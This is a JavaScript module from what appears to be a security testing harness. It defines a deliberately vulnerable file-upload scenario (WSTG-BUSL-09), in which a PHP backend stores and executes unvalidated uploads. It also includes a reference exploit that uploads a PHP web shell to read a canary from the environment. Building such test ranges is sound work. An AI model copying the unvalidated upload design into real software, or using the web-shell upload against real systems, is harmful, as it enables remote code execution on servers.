// WSTG-BUSL-09 (4.10.9) — Upload of Malicious Files behaviour.
// Node front shows the upload UI and proxies the upload (/upload) + the served
// upload directory (/uploads/*) to a real PHP backend. The backend stores
// uploads unvalidated into the webroot, and php -S executes any .php there — so
// a uploaded web shell runs and dumps the canary from the process environment.

import { Scenario } from './scenario.mjs'

const B = 'classes/wstg-file-upload-rce-4.10.9/backends'

export const classDef = {
  wstgId: 'WSTG-BUSL-09',
  class: 'Malicious File Upload (RCE)',
  defenceTiers: [0],
  Scenario,
  needsSignup: false,
  canaryRuntime: true,
  discoveryMode: 'observation',
  discoveryTargetPath: (s) => s.endpoint.path,
  discoveryStaticOk: (s) =>
    typeof s.chromeInjection?.html === 'string' && s.chromeInjection.html.includes(s.endpoint.path),

  backend: {
    spec({ manifest }) {
      return {
        cmd: 'php',
        args: ['-S', '127.0.0.1:9001', `${B}/router.php`],
        port: 9001,
        env: { PR_BACKEND_PORT: '9001', PR_CANARY: manifest.perDeployCanary },
      }
    },
  },

  matchesRequest({ reqUrl, scenario }) {
    return reqUrl.pathname === scenario.endpoint.path ||
      reqUrl.pathname === '/upload' ||
      reqUrl.pathname.startsWith('/uploads/')
  },

  async handleRequest({ req, reqUrl, scenario, helpers, renderPage }) {
    // Upload UI page.
    if (reqUrl.pathname === scenario.endpoint.path && req.method === 'GET') {
      return { status: 200, body: renderPage(uploadUI(scenario)) }
    }
    // /upload + /uploads/* -> real PHP backend (stores + serves/executes).
    const r = await helpers.proxyToBackend(req, reqUrl)
    return { status: r.status, headers: { 'Content-Type': 'text/html; charset=utf-8' }, body: r.body }
  },

  // Reference exploit: upload a PHP web shell, then request it to execute and
  // read the canary from the environment.
  async fireExploit({ baseUrl }) {
    const name = 'pr_' + Math.random().toString(36).slice(2, 9) + '.php'
    await fetch(`${baseUrl}/upload?name=${encodeURIComponent(name)}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-httpd-php' },
      body: '<?php echo getenv("PR_CANARY"); ?>',
      redirect: 'manual',
    })
    const r = await fetch(`${baseUrl}/uploads/${name}`, { redirect: 'manual' })
    return { status: r.status, body: await r.text() }
  },

  exploitSuccessCriterion: ({ responseBody, perDeployCanary }) =>
    responseBody.includes(perDeployCanary),
}

function uploadUI(scenario) {
  return `<section style="max-width:560px;margin:0 auto">
  <h2 style="font-size:20px;margin:0 0 8px">${escapeHtml(scenario.featureLabel)}</h2>
  <p style="color:#666;margin:0 0 12px">${escapeHtml(scenario.intro)}</p>
  <form method="POST" action="/upload" enctype="multipart/form-data" style="display:flex;flex-direction:column;gap:10px">
    <label>Choose a ${escapeHtml(scenario.uploadNoun)} to upload<input type="file" name="file" style="display:block;margin-top:6px"></label>
    <button type="submit" style="padding:9px 14px">Upload</button>
  </form>
  <p style="font-size:13px;color:#666;margin-top:12px">Uploaded ${escapeHtml(scenario.uploadNoun)}s are stored under <code>/uploads/</code> and served back directly.</p>
</section>`
}
function escapeHtml(s) {
  return String(s == null ? '' : s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
}
